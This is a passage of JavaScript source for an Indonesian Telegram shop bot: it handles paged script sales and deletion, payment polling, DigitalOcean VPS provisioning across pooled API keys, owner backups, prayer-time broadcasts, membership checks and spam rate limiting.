// [ DELETE SCRIPT ]
// --------------------------------------------------------------------------
async function sendDeleteScriptPage(ctx, page) {
  const pageData = fileScript.getScriptsPage(page, 5);
  
  if (pageData.scripts.length === 0 && page > 0) {
    return sendDeleteScriptPage(ctx, 0);
  }

  if (pageData.scripts.length === 0) {
    return ctx.reply(
      `<blockquote>🗑️ <b>HAPUS SCRIPT</b></blockquote>\n\nTidak ada script yang bisa dihapus.`,
      { parse_mode: "HTML" }
    );
  }

  const buttons = pageData.scripts.map(script => [
    Markup.button.callback(
      `🗑️ ${script.name} (Rp${script.price.toLocaleString('id-ID')})`,
      `delete_script|${script.id}`
    )
  ]);

  const navButtons = [];
  
  if (page > 0) {
    navButtons.push(
      Markup.button.callback("⬅️ Prev", `delete_page|${page - 1}`)
    );
  }
  
  if (page < pageData.pages - 1) {
    navButtons.push(
      Markup.button.callback("Next ➡️", `delete_page|${page + 1}`)
    );
  }

  if (navButtons.length > 0) {
    buttons.push(navButtons);
  }

  buttons.push([
    Markup.button.callback("❌ Batal", "delete_cancel")
  ]);

  const message = `<blockquote>🗑️ <b>HAPUS SCRIPT</b> (Halaman ${page + 1}/${pageData.pages})</blockquote>\n\nPilih script yang ingin dihapus:`;

  if (ctx.callbackQuery) {
    await ctx.editMessageText(message, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    });
  } else {
    await ctx.reply(message, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    });
  }
}

// --------------------------------------------------------------------------
// [ AUTO ORDER SCRIPT ]
// --------------------------------------------------------------------------
async function sendScriptPage(ctx, page) {
    const pageData = fileScript.getScriptsPage(page, 6);
    if (pageData.scripts.length === 0 && page > 0) return sendScriptPage(ctx, 0);
    if (pageData.scripts.length === 0) return ctx.reply(`<blockquote><b>Tidak ada script tersedia saat ini.</b></blockquote>`, { parse_mode: "HTML" });
    const buttons = pageData.scripts.map(script => [Markup.button.callback(`${script.name} - Rp${script.price.toLocaleString('id-ID')}`, `script_select|${script.id}`)]);
    const navButtons = [];
    if (page > 0) navButtons.push(Markup.button.callback("⬅️ Prev", `script_page|${page - 1}`));
    if (page < pageData.pages - 1) navButtons.push(Markup.button.callback("Next ➡️", `script_page|${page + 1}`));
    if (navButtons.length > 0) buttons.push(navButtons);
    buttons.push([Markup.button.callback("❌ Batal", "script_cancel")]);
    const message = page > 0 ? `<blockquote>📦 <b>LIST SCRIPT</b> (Halaman ${page + 1}/${pageData.pages})</blockquote>\n\nPilih script yang ingin dibeli:` : `<blockquote>📦 <b>LIST SCRIPT</b></blockquote>\n\nPilih script yang ingin dibeli:`;
    if (ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
    else await ctx.reply(message, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
}

function startScriptPaymentCheck(ctx, orderId, amount, scriptId) {
  const session = ScriptSession.get(ctx.from.id);
  if (!session) return;

  const startTime = Date.now();
  const checkInterval = setInterval(async () => {
    try {
      const paymentCheck = await axios.get(
        "https://app.pakasir.com/api/transactiondetail",
        {
          params: {
            project: config.PAKASIR_PROJECT,
            order_id: orderId,
            amount: amount,
            api_key: config.PAKASIR_API_KEY
          },
          timeout: 5000
        }
      );

      if (paymentCheck.data?.transaction?.status === "completed") {
        clearInterval(checkInterval);
        
        // Hapus pesan QRIS
        if (session.qrisMessageId && session.qrisChatId) {
          await ctx.telegram.deleteMessage(
            session.qrisChatId, 
            session.qrisMessageId
          ).catch(() => {});
        }

        // Kirim script ke user
        await sendScriptToUser(ctx, scriptId, orderId, amount);
        
        return;
      }

      // Cek expired
      if (Date.now() - startTime > QRIS_EXPIRE) {
        clearInterval(checkInterval);
        
        // Hapus pesan QRIS
        if (session.qrisMessageId && session.qrisChatId) {
          await ctx.telegram.deleteMessage(
            session.qrisChatId, 
            session.qrisMessageId
          ).catch(() => {});
        }
        
        // Kirim pesan expired
        await ctx.reply("❌ QRIS telah expired (15 menit). Silakan ulangi pembelian.");
        ScriptSession.delete(ctx.from.id);
      }

    } catch (error) {
      console.error("Script payment check error:", error.message);
    }
  }, config.PAKASIR_CHECK_INTERVAL || 5000);
}

async function sendScriptToUser(ctx, scriptId, orderId, amount) {
  try {
    const script = fileScript.getScript(scriptId);
    if (!script) {
      throw new Error("Script tidak ditemukan");
    }

    await ctx.telegram.sendDocument(
      ctx.chat.id,
      script.fileId,
      {
        caption: `<blockquote>✅ <b>PEMBELIAN SCRIPT BERHASIL!</b>
📦 <b>Script:</b> ${script.name}
💰 <b>Harga:</b> Rp${amount.toLocaleString('id-ID')}
🆔 <b>Order ID:</b> ${orderId}

<b>📝 Deskripsi:</b>
${script.description || 'Tidak ada deskripsi'}

<b>⚠️ Catatan:</b>
• Script ini milik pribadi, jangan dibagikan
• Untuk masalah teknis hubungi admin
• Terima kasih telah berbelanja!</blockquote>`,
        parse_mode: "HTML"
      }
    ).catch(async (error) => {
      console.error("Gagal kirim file:", error.message);
      
      await ctx.reply(
        `<blockquote>✅ <b>PEMBELIAN SCRIPT BERHASIL!</b>
📦 <b>Script:</b> ${script.name}
💰 <b>Harga:</b> Rp${amount.toLocaleString('id-ID')}
🆔 <b>Order ID:</b> ${orderId}

<b>📝 Deskripsi:</b>
${script.description || 'Tidak ada deskripsi'}

<b>⚠️ Catatan:</b>
• Transaksi success, namun ada masalah pengiriman file
• Hubungi admin @ReyValdz untuk mendapatkan file
• Sertakan Order ID: <code>${orderId}</code></blockquote>`,
        { parse_mode: "HTML" }
      );
    });

    await sendTesti("script", {
      userId: ctx.from.id,
      username: ctx.from.username || ctx.from.first_name,
      scriptName: script.name,
      amount: amount,
      orderId: orderId
    });

    ScriptSession.delete(ctx.from.id);

  } catch (error) {
    console.error("Send script error:", error.message);
    
    await ctx.reply(
      `<blockquote>❌ <b>GAGAL MENGIRIM SCRIPT</b>\n\nPembayaran berhasil tetapi gagal mengirim script. Hubungi @ReyValdz dengan bukti pembayaran:\n🆔 Order ID: ${orderId}</blockquote>`,
      { parse_mode: "HTML" }
    );
    
    await ctx.telegram.sendMessage(
      config.owner,
      `<blockquote>⚠️ <b>SCRIPT FAILED</b>\n\nUser: ${ctx.from.username || ctx.from.first_name} (${ctx.from.id})\nOrder: ${orderId}\nScript: ${scriptId}\nError: ${error.message}</blockquote>`,
      { parse_mode: "HTML" }
    );
    
    ScriptSession.delete(ctx.from.id);
  }
}

// --------------------------------------------------------------------------
// [ AUTO ORDER VPS ]
// --------------------------------------------------------------------------
async function getDropletStatus() {
  try {
    let totalRemaining = 0;
    let totalUsed = 0;
    let totalLimit = 0;
    
    for (let i = 1; i <= 50; i++) {
      const apiKey = apiDigitalOcean[`akun${i}`];
      if (!apiKey || apiKey.length < 64) continue;
      
      const accResult = await doApiRequest(apiKey, '/account');
      if (!accResult.success) continue;
      
      const drpResult = await doApiRequest(apiKey, '/droplets');
      if (!drpResult.success) continue;
      
      const limit = accResult.data.account.droplet_limit;
      const used = (drpResult.data.droplets || []).length;
      const remain = limit - used;
      
      totalRemaining += remain;
      totalUsed += used;
      totalLimit += limit;
    }
    
    return {
      remain: totalRemaining,
      used: totalUsed,
      limit: totalLimit
    };
  } catch (error) {
    console.error("Error checking droplet status:", error.message);
    return { remain: 0, used: 0, limit: 0 };
  }
}

async function getBestDOAccount() {
  let bestAccount = null;
  let maxRemaining = 0;
  
  for (let i = 1; i <= 50; i++) {
    const apiKey = apiDigitalOcean[`akun${i}`];
    if (!apiKey || apiKey.length < 64) continue;
    
    const accResult = await doApiRequest(apiKey, '/account');
    if (!accResult.success) continue;
    
    const drpResult = await doApiRequest(apiKey, '/droplets');
    if (!drpResult.success) continue;
    
    const limit = accResult.data.account.droplet_limit;
    const used = (drpResult.data.droplets || []).length;
    const remain = limit - used;
    
    if (remain > maxRemaining) {
      maxRemaining = remain;
      bestAccount = {
        version: i,
        apiKey: apiKey,
        remain: remain
      };
    }
  }
  
  return bestAccount;
}

async function CreateBuyVps(orderData) {
  const {
    userId,
    paket,
    plan,
    os,
    region,
    price,
    orderId,
    username
  } = orderData || {};
  
  const Infouser = username;
  try {
    if (!userId || !plan || !os) {
      throw new Error("Data order tidak lengkap");
    }

    const bestAccount = await getBestDOAccount();
    if (!bestAccount || !bestAccount.apiKey) {
      throw new Error("Tidak ada akun DO dengan slot tersedia");
    }

    const sizeMap = {
      "2c2": "s-2vcpu-2gb-amd",
      "4c2": "s-2vcpu-4gb-amd",
      "8c4": "s-4vcpu-8gb-amd",
      "16c4": "s-4vcpu-16gb-amd",
      "16c8": "s-8vcpu-16gb-amd"
    };

    const size = sizeMap[plan];
    if (!size) throw new Error("Plan tidak dikenal: " + String(plan));

    const hostname = `AldzyIsHere-${userId}-${Date.now().toString().slice(-6)}`;
    const password = "AldzyIsHere#" + Math.random().toString(36).slice(-8).toUpperCase();

    const regionMap = {
      "sgp1": "sgp1","nyc3": "nyc3","sfo3": "sfo3","ams3": "ams3",
      "lon1": "lon1","fra1": "fra1","tor1": "tor1","blr1": "blr1","syd1": "syd1"
    };

    const Region = regionMap[region] || region || "sgp1";

    const payload = {
      name: hostname,
      region: Region,
      size: size,
      image: os,
      ipv6: true,
      backups: false,
      tags: [
        `User:${userId}`,
        `Order:${orderId || "-"}`,
        `Paket:${paket || "-"}`,
        `Plan:${plan}`
      ],
      user_data: `#cloud-config
password: ${password}
chpasswd: { expire: False }`
    };

    const result = await doApiRequest(bestAccount.apiKey, '/droplets', 'POST', payload);
    if (!result || !result.success) {
      throw new Error(result?.error || "Gagal membuat VPS");
    }

    const dropletId = result?.data?.droplet?.id;
    if (!dropletId) throw new Error("Droplet ID tidak ditemukan di response DO");

    // Ambil IP
    let ip = "Pending";
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 5000));
      const cek = await doApiRequest(bestAccount.apiKey, `/droplets/${dropletId}`);
      const publicNet = cek?.data?.droplet?.networks?.v4?.find(n => n.type === "public");
      if (publicNet?.ip_address) {
        ip = publicNet.ip_address;
        break;
      }
    }

    const createdAt = new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      weekday: "long",
      day: "numeric",
      month: "long",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });

    // ==============================
    // KIRIM KE USER
    // ==============================
    try {
      if (typeof bot !== "undefined" && bot?.telegram) {
        await bot.telegram.sendMessage(
          userId,
`<blockquote>✅ <b>VPS BERHASIL DIBUAT!</b></blockquote>
<blockquote>🖥️ <b>DETAIL DATA VPS</b>
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP ADDRESS: <code>${ip}</code>
🆔 USERNAME: root
🔐 PASSWORD: <code>${password}</code>
🧩 HOSTNAME: ${hostname}
🌍 REGION: ${Region}
💿 OS: ${os}</blockquote>
<blockquote>🛍️ <b>DETAIL PEMBELIAN</b>
━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>ID Droplet:</b> ${dropletId}
📦 <b>Paket:</b> ${String(paket || "-").toUpperCase()} - ${plan}
🆔 <b>Order ID:</b> ${orderId || "-"}
🎉 <b>Garansi:</b> ${paket === 'low' ? '1' : paket === 'medium' ? '2' : '3'} HARI</blockquote>

<blockquote>📝 <b>𝖲𝗒𝖺𝗋𝖺𝗍 𝖢𝗅𝖺𝗂𝗆 𝖦𝖺𝗋𝖺𝗇𝗌𝗂</b></blockquote>
1. Sertakan bukti transfer
2. Screenshot chat saat pembelian
3. Cantumkan Order ID: ${orderId || "-"}
4. Lampirkan data VPS (IP, Username, Password)
 
© <b>Real AldzyIsHere — Hosting Since 2026</b>`,
          { parse_mode: "HTML" }
        );
      }
    } catch (e) {
      console.warn("Gagal kirim ke user:", e?.message);
    }

    // ==============================
    // NOTIF CHANNEL
    // ==============================
    try {
      if (typeof sendTesti === "function") {
        await sendTesti("vps", {
          userId,
          username: Infouser,
          paket,
          plan,
          amount: Number(price) || 0,
          orderId
        });
      }
    } catch (e) {
      console.warn("sendTesti gagal:", e?.message);
    }

    // ==============================
    // CLEANUP
    // ==============================
    try {
      if (typeof vpsOrderSession !== "undefined" && vpsOrderSession?.has(userId)) {
        vpsOrderSession.delete(userId);
      }
    } catch {}

    return { success: true, dropletId, ip };

  } catch (error) {

    console.error("Error creating VPS:", error?.message);

    try {
      if (typeof bot !== "undefined" && bot?.telegram) {
        await bot.telegram.sendMessage(
          userId,
`<blockquote>❌ <b>GAGAL MEMBUAT VPS</b>
Order ID: ${orderId || "-"}
Error: ${error?.message || error}</blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    } catch {}

    try {
      if (typeof vpsOrderSession !== "undefined" && vpsOrderSession?.has(userId)) {
        vpsOrderSession.delete(userId);
      }
    } catch {}

    return { success: false, error: error?.message || String(error) };
  }
}

// --------------------------------------------------------------------------
// [ DATABASE INITIALIZATION ]
// --------------------------------------------------------------------------
const dbDir = "./FileData/database";
if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });

if (!fs.existsSync(fileGroup)) {
    fs.writeFileSync(fileGroup, JSON.stringify([]));
    console.log(chalk.blue(`📁 Created groups.json database`));
}

if (!fs.existsSync(verifiedFile)) {
    fs.writeFileSync(verifiedFile, JSON.stringify({ verifiedUsers: [] }));
    console.log(chalk.blue(`📁 Created verified_users.json database`));
}

if (!fs.existsSync(userFile)) {
    fs.writeFileSync(userFile, JSON.stringify({ users: [] }));
    console.log(chalk.blue(`📁 Created users.json database`));
}

ensureDb(premiumFile, []);
ensureDb(adminFile, []);
ensureDb(partnerFile, []);
ensureDb(cdFile, {});

if (!fs.existsSync(path.dirname(FILTER_FILE))) fs.mkdirSync(path.dirname(FILTER_FILE), { recursive: true });
if (!fs.existsSync(FILTER_FILE)) fs.writeFileSync(FILTER_FILE, JSON.stringify({}, null, 2));

premiumUsers = loadPremiumUsers();
adminUsers = loadAdminUsers();
partnerUsers = loadPartnerUsers();

// --------------------------------------------------------------------------
// [ HITUNG PLUGIN & FITUR ]
// --------------------------------------------------------------------------
function hitungFitur(listMode = false) {
    let commands = [], fiturJson = [];
    try {
        const file = fs.readFileSync("./index.js", "utf-8");
        const regex = /bot\.command\(['"`](.*?)['"`]/g;
        let match;
        while ((match = regex.exec(file)) !== null) commands.push(match[1]);
        if (fs.existsSync("./FileData/database/fitur.json")) {
            const raw = fs.readFileSync("./FileData/database/fitur.json", "utf-8");
            try {
                fiturJson = JSON.parse(raw);
                if (Array.isArray(fiturJson)) commands.push(...fiturJson);
                else commands.push(...Object.keys(fiturJson));
            } catch (err) { console.error("fitur.json error:", err); }
        }
    } catch (err) { console.error("Error hitungFitur:", err); }
    return listMode ? commands : commands.length;
}

function hitungPlugin(listMode = false) {
    let pluginCommands = [];
    const menuDir = path.join(__dirname, "./menu");
    try {
        if (!fs.existsSync(menuDir)) return listMode ? [] : 0;
        const files = fs.readdirSync(menuDir);
        for (const file of files) {
            if (file.endsWith('.js')) {
                const content = fs.readFileSync(path.join(menuDir, file), 'utf-8');
                const regex = /bot\.command\(['"`](.*?)['"`]/g;
                let match;
                while ((match = regex.exec(content)) !== null) pluginCommands.push(match[1]);
            }
        }
    } catch (err) { console.error(chalk.red(`❌ Error hitungPlugin: ${err.message}`)); }
    return listMode ? pluginCommands : pluginCommands.length;
}

function hitungTotalFitur(listMode = false) {
    const mainCommands = hitungFitur(true);
    const pluginCommands = hitungPlugin(true);
    const allCommands = [...mainCommands, ...pluginCommands];
    const uniqueCommands = [...new Set(allCommands)];
    return listMode ? uniqueCommands : uniqueCommands.length;
}

// --------------------------------------------------------------------------
// [ USER LIMIT & DATABASE ]
// --------------------------------------------------------------------------
function getUserLimitFromFile(userId) {
    try { return getUserLimit(userId); } catch (error) {
        console.error(chalk.red(`❌ Error getting user limit: ${error.message}`));
        return { dailyLimit: 10, remaining: 10, lastReset: new Date().toDateString(), totalUsed: 0 };
    }
}

function addLimitToUser(userId, amount) {
    try { return addUserLimit(userId, amount); } catch (error) {
        console.error(chalk.red(`❌ Error adding limit: ${error.message}`));
        const userLimit = getUserLimitFromFile(userId);
        const newDailyLimit = (userLimit.dailyLimit || 0) + amount;
        const newRemaining = (userLimit.remaining || 0) + amount;
        const limitsFile = './FileData/database/limits.json';
        let limits = {};
        if (fs.existsSync(limitsFile)) limits = JSON.parse(fs.readFileSync(limitsFile, 'utf8'));
        if (!limits[userId]) limits[userId] = { dailyLimit: newDailyLimit, remaining: newRemaining, totalUsed: 0, lastReset: new Date().toDateString() };
        else { limits[userId].dailyLimit = newDailyLimit; limits[userId].remaining = newRemaining; }
        fs.writeFileSync(limitsFile, JSON.stringify(limits, null, 2));
        return { success: true, newDailyLimit, newRemaining };
    }
}

const curilimitCooldowns = {};
function setCurilimitCooldown(userId, duration = 5000) { curilimitCooldowns[userId] = Date.now() + duration; }
function checkCurilimitCooldown(userId) {
    if (curilimitCooldowns[userId] && Date.now() < curilimitCooldowns[userId]) return Math.ceil((curilimitCooldowns[userId] - Date.now()) / 1000);
    return 0;
}

function loadVerifiedUsers() {
    try {
        if (fs.existsSync(verifiedFile)) return JSON.parse(fs.readFileSync(verifiedFile)).verifiedUsers || [];
    } catch (error) { console.log(chalk.yellow(`⚠️ Error loading verified users: ${error.message}`)); }
    return [];
}

function saveVerifiedUsers(users) {
    try { fs.writeFileSync(verifiedFile, JSON.stringify({ verifiedUsers: users }, null, 2)); } catch (error) { console.log(chalk.red(`❌ Error saving verified users: ${error.message}`)); }
}

function isUserVerified(userId) {
    try { return loadVerifiedUsers().includes(userId.toString()); } catch (error) { console.log(chalk.yellow(`⚠️ Error checking user verification: ${error.message}`)); return false; }
}

function markUserAsVerified(userId) {
    try {
        const verifiedUsers = loadVerifiedUsers();
        const userIdStr = userId.toString();
        if (!verifiedUsers.includes(userIdStr)) {
            verifiedUsers.push(userIdStr);
            saveVerifiedUsers(verifiedUsers);
            console.log(chalk.green(`✅ User ${userIdStr} marked as verified`));
            return true;
        }
        return false;
    } catch (error) { console.log(chalk.red(`❌ Error marking user as verified: ${error.message}`)); return false; }
}

function loadAllUsers() {
    try {
        if (fs.existsSync(userFile)) return JSON.parse(fs.readFileSync(userFile)).users || [];
    } catch (error) { console.log(chalk.yellow(`⚠️ Error loading users: ${error.message}`)); }
    return [];
}

function saveAllUsers(users) {
    try { fs.writeFileSync(userFile, JSON.stringify({ users: users }, null, 2)); } catch (error) { console.log(chalk.red(`❌ Error saving users: ${error.message}`)); }
}

function addUserToDatabase(userId, username, firstName, lastName, ctx = null) {
    try {
        const users = loadAllUsers();
        const userIdStr = userId.toString();
        const existingUser = users.find(u => u.id === userIdStr);
        if (!existingUser) {
            const newUser = { 
                id: userIdStr, 
                username: username || "", 
                firstName: firstName || "", 
                lastName: lastName || "", 
                joinDate: new Date().toISOString(), 
                lastActive: new Date().toISOString() 
            };
            users.push(newUser);
            saveAllUsers(users);
            
            /// ----- notif start ------- \\\
            if (ctx && ctx.from) {
                sendStartInfoToChannel(ctx.from).catch(() => {});
            }
            
            return true;
        } else {
            existingUser.lastActive = new Date().toISOString();
            saveAllUsers(users);
            return false;
        }
    } catch (error) { 
        return false; 
    }
}

function getTotalUsers() {
    try { return loadAllUsers().length; } catch (error) { console.log(chalk.yellow(`⚠️ Error counting users: ${error.message}`)); return 0; }
}

function getUserInfoFromDb(userId) {
    try { return loadAllUsers().find(u => u.id === userId.toString()); } catch (error) { console.log(chalk.yellow(`⚠️ Error getting user info: ${error.message}`)); return null; }
}

// --------------------------------------------------------------------------
// [ AUTO BACKUP ]
// --------------------------------------------------------------------------
async function AutoBackup() {
    let zipPath = null, backupDir = null;
    try {
        console.log(chalk.cyan('🔄 Memulai auto backup...'));
        backupDir = './backup';
        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
        dellBackupOld(backupDir);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        zipPath = path.join(backupDir, `Van-Backup-${timestamp}.zip`);
        const rootDir = process.cwd();
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });
        console.log(chalk.cyan('⏳ Mengumpulkan source code...'));
        const archivePromise = new Promise((resolve, reject) => {
            output.on('close', () => { console.log(chalk.green(`🔄 proses backup...`)); resolve(); });
            archive.on('error', (err) => { console.error(chalk.red(`❌ Archive error: ${err.message}`)); reject(err); });
            archive.on('warning', (err) => {
                if (err.code === 'ENOENT') console.log(chalk.yellow(`⚠️ Archive warning: ${err.message}`));
                else { console.error(chalk.red(`❌ Archive warning: ${err.message}`)); reject(err); }
            });
            archive.pipe(output);
            archive.glob('**/*', {
                cwd: rootDir,
                ignore: [
                'node_modules/**', 
                '.npm/**', 
                '.cache/**', 
                '*.cache', 
                '.cache', 
                'package-lock.json', 
                'backup/**', 
                'backup', 
                '*.log', 
                '*.tmp', 
                '.env', 
                '.git/**'],
                dot: true
            });
        });
        await archive.finalize();
        await archivePromise;
        console.log(chalk.green(`✅ Auto backup selesai. File Berhasil di kirim`));
        if (!fs.existsSync(zipPath)) throw new Error(`File backup tidak ditemukan: ${zipPath}`);
        const fileStats = fs.statSync(zipPath);
        const size = formatBytes(fileStats.size);
        const MAX_TELEGRAM_SIZE = 50 * 1024 * 1024;
        console.log(chalk.cyan(`📁 Size file: ${size}`));
        if (fileStats.size > MAX_TELEGRAM_SIZE) {
            console.log(chalk.yellow(`⚠️ File terlalu besar (${size}), tidak dikirim ke Telegram`));
            await bot.telegram.sendMessage(OWNER_ID, `⚠️ Auto Backup Gagal Dikirim\n\n💾 Size: ${size}\n📁 File: ${path.basename(zipPath)}\n❌ File terlalu besar (>50MB) untuk dikirim via Telegram Bot`);
            return;
        }
        console.log(chalk.cyan('📤 Mengirim backup ke Telegram...'));
        if (!OWNER_ID) throw new Error('OWNER_ID tidak terdefinisi');
        await bot.telegram.sendDocument(OWNER_ID, { source: fs.createReadStream(zipPath), filename: `Backup-${timestamp}.zip` }, {
            caption: `✅ AUTO BACKUP BERHASIL\n\n📅 Tanggal: ${new Date().toLocaleString('id-ID')}\n💾 Size: ${size}\n📁 Semua file dan folder telah di-backup`
        });
        console.log(chalk.green('📦 Auto backup berhasil dikirim ke Telegram'));
    } catch (err) {
        console.error(chalk.red(`❌ Auto backup error: ${err.message}`));
        try {
            await bot.telegram.sendMessage(OWNER_ID, `❌ Auto Backup Error\n\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n📛 Error: ${err.message}\n🔄 Proses akan diulang pada interval berikutnya.`);
        } catch (telegramErr) { console.error(chalk.red(`❌ Gagal mengirim notifikasi error: ${telegramErr.message}`)); }
    } finally {
        if (zipPath && fs.existsSync(zipPath)) {
            try {
                await sleep(5000);
                fs.unlinkSync(zipPath);
                console.log(chalk.yellow(`🗑️ File backup dihapus: ${path.basename(zipPath)}`));
            } catch (unlinkErr) { console.error(chalk.yellow(`⚠️ Gagal menghapus file: ${unlinkErr.message}`)); }
        }
    }
}

function dellBackupOld(backupDir) {
    try {
        if (!fs.existsSync(backupDir)) return;
        const files = fs.readdirSync(backupDir).filter(file => file.startsWith('Van-Backup-') && file.endsWith('.zip'))
            .map(file => ({ name: file, path: path.join(backupDir, file), time: fs.statSync(path.join(backupDir, file)).mtime.getTime() }))
            .sort((a, b) => b.time - a.time);
        if (files.length > 10) files.slice(10).forEach(f => { try { fs.unlinkSync(f.path); console.log(chalk.yellow(`🗑️ Hapus backup lama: ${f.name}`)); } catch (deleteErr) { console.error(chalk.yellow(`⚠️ Gagal hapus ${f.name}: ${deleteErr.message}`)); } });
    } catch (err) { console.error(chalk.red(`❌ Clean backup error: ${err.message}`)); }
}

// --------------------------------------------------------------------------
// [ JADWAL SHOLAT ]
// --------------------------------------------------------------------------
// Jadwal Sholat
const jadwalSholat = {
    Lampung: {
        subuh: '04:52',
        dhuha: '06:00',
        duhur: '12.10',
        ashar: '16:20',
        magrib: '18:10',
        isya: '19:30'
    }
};

const KOTA_SHOLAT = "Palembang";

const quotesSholat = {
    subuh: "Shalat subuh lebih baik daripada tidur.",
    dhuha: "Shalat Dhuha adalah sedekah terbaik untuk seluruh persendian.",
    duhur: "Tunaikanlah shalat saat matahari tergelincir.",
    ashar: "Jagalah shalat ashar agar amalanmu tidak terhapus.",
    magrib: "Segeralah berbuka dan tunaikan Magrib saat matahari terbenam.",
    isya: "Shalat Isya adalah cahaya di kegelapan malam."
};

setInterval(async () => {
    try {
        const timeNow = moment().tz("Asia/Jakarta").format("HH:mm");
        const jadwalHariIni = jadwalSholat[KOTA_SHOLAT];

        if (!jadwalHariIni) return;

        for (let [sholat, waktu] of Object.entries(jadwalHariIni)) {
            if (timeNow === waktu) {
                
                // Load database
                if (!fs.existsSync(userFile)) {
                    console.log("❌ File users.json tidak ditemukan!");
                    return;
                }
                
                let usersData = [];
                try {
                    usersData = JSON.parse(fs.readFileSync(userFile, 'utf8'));
                    if (Array.isArray(usersData)) {
                        usersData = { users: usersData };
                    }
                } catch (e) {
                    console.error("Error reading users.json:", e);
                    return;
                }

                const userIds = (usersData.users || [])
                    .map(u => u.id)
                    .filter(id => id && id.toString().match(/^\d+$/));

                if (userIds.length === 0) {
                    console.log("⚠️ Tidak ada user untuk dikirim notifikasi sholat.");
                    return;
                }

                // Template Pesan
                const pesanText = 
`🕌 <b>WAKTU SHOLAT ${sholat.toUpperCase()} TELAH TIBA</b>

<b>Saat waktu ${sholat} tiba, segeralah tunaikan kewajibanmu.</b>

⏰ <b>Waktu:</b> ${waktu} WIB
📍 <b>Wilayah:</b> ${KOTA_SHOLAT} dan sekitarnya

<i>"${quotesSholat[sholat] || 'Sesungguhnya shalat itu mencegah dari perbuatan keji dan mungkar.'}"</i>
(QS. Al-Ankabut: 45)

📚 <b>Keutamaan Sholat:</b>
• Mendapat pahala besar dari Allah
• Menjaga diri dari perbuatan maksiat
• Membersihkan hati dan pikiran
• Mendatangkan ketenangan jiwa

<b>Jangan tunda-tunda sholatmu! 🤲</b>
━━━━━━━━━━━━━━━━━━━━━━`;

                const keyboard = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "👑 Hubungi Owner", url: `https://t.me/ReyValdz` }]
                        ]
                    }
                };

                console.log(`[🕌 SHOLAT] Mengirim notifikasi ${sholat} ke ${userIds.length} user...`);

                let sent = 0;
                for (const uid of userIds) {
                    try {
                        await bot.telegram.sendMessage(uid, pesanText, {
                            parse_mode: "HTML",
                            ...keyboard
                        });
                        sent++;
                        if (sent % 5 === 0) await new Promise(r => setTimeout(r, 500));
                    } catch (e) {
                        // Skip jika user block bot
                    }
                }
                
                console.log(`✅ Notifikasi ${sholat} selesai dikirim ke ${sent} user.`);
                break; 
            }
        }
    } catch (error) {
        console.error("[ERROR] Sholat notification:", error);
    }
}, 60000);

// --------------------------------------------------------------------------
// [ CEK JOIN GRUP & CHANNEL ]
// --------------------------------------------------------------------------
async function checkChannel(userId) {
    try {
        if (!config.Join_Channel || config.disableChannelCheck) return true;
        let channelUsername;
        if (config.Join_Channel.includes('t.me/')) channelUsername = config.Join_Channel.split('/').pop().replace('@', '');
        else if (config.Join_Channel.startsWith('@')) channelUsername = config.Join_Channel.replace('@', '');
        else channelUsername = config.Join_Channel.replace('@', '');
        if (!channelUsername) return true;
        const chatMember = await bot.telegram.getChatMember(`@${channelUsername}`, userId);
        return ['member', 'administrator', 'creator'].includes(chatMember.status);
    } catch (error) { console.log(chalk.yellow(`⚠️ Error Join Channel: ${error.message}`)); return false; }
}

async function checkGroup(userId) {
    try {
        if (!config.Join_Grup || config.disableGroupCheck) return true;
        let groupUsername;
        if (config.Join_Grup.includes('t.me/')) groupUsername = config.Join_Grup.split('/').pop().replace('@', '');
        else if (config.Join_Grup.startsWith('@')) groupUsername = config.Join_Grup.replace('@', '');
        else groupUsername = config.Join_Grup.replace('@', '');
        if (!groupUsername) return true;
        const chatMember = await bot.telegram.getChatMember(`@${groupUsername}`, userId);
        return ['member', 'administrator', 'creator'].includes(chatMember.status);
    } catch (error) { console.log(chalk.yellow(`⚠️ Error Join Grup: ${error.message}`)); return false; }
}

// --------------------------------------------------------------------------
// [ MIDDLEWARE ]
// --------------------------------------------------------------------------
bot.use(async (ctx, next) => {
    try {
        if (!ctx.from || !ctx.message?.text) return next();
        const id = ctx.from.id;
        const now = Date.now();
        const data = userSpam.get(id) || { count: 0, time: now };
        if (now - data.time < SPAM_TIME) {
            data.count++;
            if (data.count > MIDD) return;
        } else { data.count = 1; data.time = now; }
        userSpam.set(id, data);
        await next();
    } catch (e) { console.log("[ ERROR ]", e); }
});

// --------------------------------------------------------------------------
// [ GLOBAL LIMITt ]
// --------------------------------------------------------------------------
bot.use(async (ctx, next) => {
    if (ctx.updateType === "callback_query") return next();
    if (!ctx.from) return next();
    const userId = ctx.from.id.toString();
    if (isOwner(userId)) return next();
    if (!ctx.message?.text?.startsWith("/") || ctx.message.text.startsWith("/start")) return next();
    const result = useLimit(userId, "global");
    if (!result.success) { await ctx.reply(result.message, { parse_mode: "Markdown" }); return; }
    return next();
});

// --------------------------------------------------------------------------
// [ GROUP MANAGEMENT HANDLERS ]
// --------------------------------------------------------------------------
bot.on('new_chat_members', async (ctx) => {
    try {
        const botId = ctx.botInfo.id;
        const isBotAdded = ctx.message.new_chat_members.some(member => member.id === botId);
        if (isBotAdded && ctx.chat.type !== 'private') {
            const groupId = ctx.chat.id.toString();
            let groups = [];
            if (fs.existsSync(fileGroup)) { try { groups = JSON.parse(fs.readFileSync(fileGroup, 'utf8')); } catch (e) { groups = []; } }
            if (!groups.includes(groupId)) {
                groups.push(groupId);
                fs.writeFileSync(fileGroup, JSON.stringify(groups));
                console.log(chalk.green(`✅ Bot ditambahkan ke grup: ${groupId}`));
                console.log(chalk.blue(`📊 Total grup: ${groups.length}`));
            }
        }
